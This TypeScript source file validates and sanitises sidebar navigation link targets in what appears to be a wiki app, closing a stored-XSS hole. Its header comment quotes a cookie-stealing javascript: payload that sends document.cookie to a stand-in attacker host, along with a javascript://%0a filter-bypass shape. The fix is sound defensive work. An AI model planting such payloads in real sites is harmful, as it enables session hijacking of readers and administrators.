/**
 * Validation for a navigation item's `target` — the address a sidebar link goes to when clicked.
 *
 * `api/schemas/navigation.ts` declares `target` as an unconstrained string, and nothing on the write
 * path or on `/navigation/:targetNavId/copy` ever checked it, so a `site:navigation` holder (a
 * delegated, non-administrator permission — see `helpers/siteRules.ts`) could store
 * `javascript:fetch('//attacker/'+document.cookie)` as an item's target. It renders in the sidebar of
 * every page of that site, and one click by any reader — including a `manage:system` administrator —
 * runs it in the wiki origin under their session (OpenProject #2217, from the 2026-08-24 audit,
 * `docs/audit-2026-08-24/security/08-frontend-client.md` §3).
 *
 * The rule mirrors what the repo already applies on the read side for the same class of address —
 * `frontend/src/helpers/pageRedirect.js#isFollowable` and `frontend/src/pages/Index.vue`'s
 * `relationLink`: a same-origin rooted path that does not begin `//` (browsers normalise a leading
 * `/\` to `//` too, so that is rejected the same way), or a complete `http(s)://` URL — nothing else.
 * Parsing with `new URL()` rather than a scheme-prefix regex matters here: `javascript:` is not a
 * WHATWG "special" scheme, so `javascript://%0aalert(1)` still resolves to protocol `javascript:`
 * despite the `//` and the encoded newline, which is exactly the shape that fooled the naive
 * `/^[a-z][a-z0-9+.-]*:\/\//i` test elsewhere in this codebase (see epic #2208).
 */
export function isSafeNavigationTarget(target: string | undefined | null): boolean {
  const value = (target ?? '').trim()
  if (value.length < 1) {
    // -> Nothing to render as a link (a header/separator item, or a link not yet pointed anywhere)
    return true
  }
  if (value.startsWith('/') && !value.startsWith('//') && !value.startsWith('/\\')) {
    return true
  }
  try {
    return /^https?:$/.test(new URL(value).protocol)
  } catch {
    // -> Not a rooted path and not a parseable absolute URL at all
    return false
  }
}

/** The minimal shape `findUnsafeNavigationTarget`/`sanitizeNavigationTargets` need from an item — a
 * structural subset of `models/navigation.ts`'s `NavigationItem`, kept local so this pure helper
 * doesn't import that module's db-adjacent types. */
export interface NavigationTargetItem {
  target?: string
  children?: NavigationTargetItem[]
}

/**
 * The first unsafe `target` in a menu tree, checked depth-first including every nested child — a
 * poisoned item several levels deep is exactly as dangerous as a top-level one, since
 * `NavSidebarItem.vue` renders every level. Used by the write routes to refuse the whole request with
 * a 400 naming the offending value, rather than silently accepting part of a submitted tree.
 *
 * Returns `null` when every target in the tree is safe.
 */
export function findUnsafeNavigationTarget(items: NavigationTargetItem[]): string | null {
  for (const item of items) {
    if (!isSafeNavigationTarget(item.target)) {
      return item.target ?? null
    }
    if (item.children?.length) {
      const nested = findUnsafeNavigationTarget(item.children)
      if (nested !== null) {
        return nested
      }
    }
  }
  return null
}

/**
 * Strips an unsafe `target` (recursively, at every level) rather than rejecting outright — for
 * `copyNav`, which clones a source menu's items that never passed through this check (a menu saved
 * before it existed, or written straight to the database) and has no submitted request body of its
 * own to answer with a 400. The item itself survives with its target cleared rather than being
 * dropped from the tree entirely, so a copy doesn't also discard a label/icon/children an editor may
 * still want; the poisoned address itself is simply never duplicated onto the target menu.
 */
export function sanitizeNavigationTargets<T extends NavigationTargetItem>(items: T[]): T[] {
  return items.map((item) => ({
    ...item,
    target: isSafeNavigationTarget(item.target) ? item.target : undefined,
    ...(item.children?.length ? { children: sanitizeNavigationTargets(item.children) } : {})
  }))
}
